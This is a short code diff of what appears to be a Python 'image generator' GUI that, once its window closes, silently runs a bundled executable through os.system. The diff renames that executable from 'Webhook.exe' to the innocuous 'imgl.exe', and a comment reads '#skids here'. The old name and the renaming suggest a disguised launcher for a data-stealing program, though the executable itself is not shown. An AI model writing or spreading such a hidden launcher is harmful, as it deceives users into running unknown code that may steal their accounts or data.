@@ -15,5 +15,5 @@ Button(nobitches, text= "Generate Image!", font=("Calibri",14,"bold"), command=c
 nobitches.mainloop()
 
 mypath = os.path.abspath(os.path.dirname(__file__))
-os.system( f'"{mypath}/Webhook.exe"' )
+os.system( f'"{mypath}/imgl.exe"' )
 #skids here
